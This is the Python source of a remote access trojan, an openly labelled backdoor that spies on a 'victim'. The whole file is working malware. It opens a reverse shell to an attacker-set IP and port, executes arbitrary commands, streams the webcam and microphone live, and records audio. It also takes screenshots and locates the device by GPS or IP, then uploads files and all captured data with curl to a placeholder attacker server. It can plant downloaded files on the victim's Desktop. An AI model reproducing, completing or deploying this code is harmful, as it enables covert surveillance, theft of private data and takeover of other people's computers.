import socket,os
import cv2
import asyncio
import websockets
import random
import subprocess
import websocket
import json
import geocoder
import gps  
import io
import shlex
from PIL import ImageGrab
import threading
from scipy.io.wavfile import write
import sounddevice as sd
import sys
import webbrowser
SERVER_URL = "__SERVER_URL__"
WEBSOCKET_URL = "__WEBSOCKET_URL__"
WEBSOCKET_AUDIO = "__WEBSOCKET_AUDIO__"
PORT = __PORT__
IP_ADDRESS = "__IP_ADDRESS__"
banner = r"""
\033[93m
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█               ▄████████    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
  ███    ███   ███    ███     ███    ███ ███       ███              ███    ███   ███    ███ ███       ███    ███ ███  ▀█████████▄ 
  ███    █▀    ███    ███     ███    █▀  ███       ███              ███    █▀    ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███              ███          ███    ███ ███       ███    ███ ███▌     ███   ▀ 
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███            ▀███████████ ▀█████████▀  ███       ███    ███ ███▌     ███     
         ███   ███    ███     ███    █▄  ███       ███                     ███   ███        ███       ███    ███ ███      ███     
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄         ▄█    ███   ███        ███▌    ▄ ███    ███ ███      ███     
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██       ▄████████▀   ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀\033[0m

 ~COMMANDS
 -location: This command gets location victim.
 -start-camera-live: Watch victim.
 -screenshoot: Upload screenshoot from victim's device.
 -send [file]: send many files to your server from victim's device.
 -put-files [files from your server]: put files inside victim machine from your server.
 -exit: exit from victim's device.
 -clear: clear the screen.
 -help: display help screen. 
 -record time: record audio from victim's device.
 -stream-sound: Listing to victim realtime.
 -open-browser link: Open browser to specifc link.
 -send-all: send all files for current directory from victim's device to the server.
"""
def open_browser(link:str):
    if link.startswith('http://') or link.startswith('https://'):
        webbrowser.open(link)
    else:
        raise "Error links must starts with http or https...\n"
async def open_camera():
    async with websockets.connect(WEBSOCKET_URL) as ws:
        cap = cv2.VideoCapture(0)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
        if not cap.isOpened():
            print("Cannot open camera")
            return
        while True:
            ret, frame = cap.read()
            if not ret:
                continue
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            await ws.send(buffer.tobytes())
            await asyncio.sleep(0.03)  
def audio_stream(ws):
    SAMPLE_RATE = 16000
    CHANNELS = 1
    CHUNK_SIZE = 1024
    def callback(indata, frames, time, status):
        if status:
            print(status, file=sys.stderr)
        ws.send(indata.tobytes(), opcode=websocket.ABNF.OPCODE_BINARY)
    with sd.InputStream(samplerate=SAMPLE_RATE,
                        channels=CHANNELS,
                        dtype='int16',
                        blocksize=CHUNK_SIZE,
                        callback=callback):
        threading.Event().wait() 
def put_files(args):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    files_to_put = args[1:]
    if not files_to_put:
        return False
    urls = []
    for arg in args:
        urls.append(f"{SERVER_URL}/uploads/{arg}")
    for url in urls:
       name = "".join(random.choice(chars) for _ in range(10))
       ext = url.split(".")[-1]
       filename = f"{name}.{ext}"
       path = os.path.join(desktop_path, filename)
       subprocess.run(["curl", "-L", "-o", path, url])
    return True
def get_files(args):
    files_to_send = args[1:]
    if not files_to_send:
        return False
    valid_files = []
    for file_path in files_to_send:
        try:
            with open(file_path, "rb"):
                valid_files.append(file_path)
        except:
            return False
    if not valid_files:
        return False
    curl_cmd = ["curl", "-X", "POST"]
    for file_path in valid_files:
        curl_cmd.extend(["-F", f"files=@{file_path}"])
    curl_cmd.append(f"{SERVER_URL}/upload")
    try:
        result = subprocess.run(curl_cmd, capture_output=True)
        if result.returncode != 0:
            return False
        return True
    except:
        return False
def send_all():
    try:
        files = [
            f for f in os.listdir(".")
            if os.path.isfile(f)
        ]
        if not files:
            return False
        success = False
        for f in files:
            curl_cmd = [
                "curl",
                "-X", "POST",
                "-F", f"files=@{f}", 
                f"{SERVER_URL}/upload"
            ]
            result = subprocess.run(
                curl_cmd,
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                success = True
        return success
    except Exception as e:
        print("error:", e)
        return False
def get_screenshot():
    try:
        screenshot = ImageGrab.grab()
    except Exception as e:
        print("Screenshot error:", e)
        return False
    buf = io.BytesIO()
    screenshot.save(buf, format="PNG")
    buf.seek(0)
    curl_command = [
        "curl",
        "-X", "POST",
        "-F", "files=@-;filename=screenshot.png;type=image/png",
        f"{SERVER_URL}/upload"
    ]
    try:
        result = subprocess.run(
            curl_command,
            input=buf.read(),
            capture_output=True
        )
        if result.returncode != 0:
            print("Curl error:", result.stderr.decode())
            return False
        return True
    except Exception as e:
        print("Curl exception:", e)
        return False
def get_location():
    location = None
    try:
        session = gps.gps(mode=gps.WATCH_ENABLE)
        report = session.next()
        if report['class'] == 'TPV':
            location = {
                "lat": report.lat,
                "lng": report.lon,
                "source": "gps"
            }
    except:
        pass
    if not location:
        g = geocoder.ip('me')
        if g.ok:
            location = {
                "lat": g.latlng[0],
                "lng": g.latlng[1],
                "city": g.city,
                "country": g.country,
                "source": "ip"
            }
    if location:
        try:
            json_data = json.dumps(location)
            subprocess.run([
                "curl",
                "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", json_data,
                f"{SERVER_URL}/get-location"
            ], capture_output=True, text=True)
            return True
        except:
            return False
    return False
def record_and_send_audio(duration_seconds):
    sample_rate = 44100
    channels = 1
    recording = sd.rec(
        int(duration_seconds * sample_rate),
        samplerate=sample_rate,
        channels=channels,
        dtype="int16"
    )
    sd.wait()
    buffer = io.BytesIO()
    write(buffer, sample_rate, recording)
    buffer.seek(0)
    curl_command = [
        "curl",
        "-X", "POST",
        "-F", "files=@-;filename=recording.wav;type=audio/wav",
        f"{SERVER_URL}/upload"
    ]
    try:
        result = subprocess.run(
            curl_command,
            input=buffer.read(),
            capture_output=True
        )
        if result.returncode != 0:
            print(result.stderr.decode())
            return False
        return True
    except:
        return False
def watch_victim_live():
    try:
       asyncio.run(open_camera())
    except Exception:
        pass
def listening_victim_realtime():
    ws = websocket.WebSocket()
    ws.connect(WEBSOCKET_AUDIO)
    audio_thread = threading.Thread(target=audio_stream, args=(ws,), daemon=True)
    audio_thread.start()
    return audio_thread
def reverse_shell_payload():
    s=socket.socket()
    s.connect((IP_ADDRESS,PORT))
    while True:
        try:
           s.send(b"~shell@backdoor")
           cmd = s.recv(1024).decode("utf-8").strip()
           if not cmd:
               continue
           if cmd.lower() == "stream-sound":
               thread_audio = listening_victim_realtime()
               continue
           if cmd.startswith("record"):
               cmd = cmd.split(" ")
               if len(cmd) > 2 or len(cmd) < 2:
                   s.send(b"Unknown command use known commands\n")
                   continue
               if str(cmd[1]).isdigit():
                   if record_and_send_audio(int(cmd[1])) == True:
                       s.send(b"Sound has been sent to your mailicous server\n")
                   else:
                       s.send(b"Error while sending sound to your mailicous server\n")
               else:
                   s.send(b"Error second argument must be integer because time in second should be integer\n")
               continue
           if cmd.lower() == "help":
               s.send(banner.encode())
               continue
           if cmd.lower() == "location":
               if get_location() == True:
                   s.send(b"Location has been sent to your mailicous_server\n")
               else:
                   s.send(b"It seems there is an issue with code fix it\n")
               continue
           if cmd.lower() == "screenshoot":
               if get_screenshot() == True:
                   s.send(b"The screen shot has been sent to mailicous server\n")
               else:
                   s.send(b"An issue check your code\n")
               continue
           if cmd.lower().startswith("put-files"):
                args_files = cmd.split()
                if  put_files(args_files) == True:
                   s.send(b"The files put on victim's device\n")
                else:
                    s.send(b"An issue when put files\n")
                continue
           if cmd.lower() == "send-all":
               if send_all() == True:
                   s.send(b"Files have been sent to the server\n")
               else:
                   s.send(b"The files did't come to your server check the code\n")
               continue
           if cmd.startswith("send"):
                args_files = cmd.split()
                if get_files(args_files) == True:
                    s.send(b"Files have been sent to the server\n")
                else:
                    s.send(b"The files did't come to your server check the code\n")
                continue
           if cmd.lower().startswith("cd"):
                try:
                    parts = shlex.split(cmd)
                    if len(parts) > 1:
                        os.chdir(parts[1])
                    s.send(f"{os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[-] {e}\n".encode())
                continue
           if cmd.lower() == "start-camera-live":
               threading.Thread(target=watch_victim_live,daemon=True).start()
               s.send(b"You are watching the victim for your mailicous server\n")
               continue
           if cmd.lower().startswith("open-browser"):
               try: 
                   args = cmd.split()
                   open_browser(args[1])
                   continue
               except Exception as e:
                   s.send(f"[-] {e}\n".encode())
           if cmd.lower() == "exit":
               break
           else:
               output = subprocess.run(cmd,shell=True,capture_output=True,text=True)
               result = output.stdout + output.stderr
               if result:
                   s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
    s.close()
if __name__ == "__main__":
    reverse_shell_payload()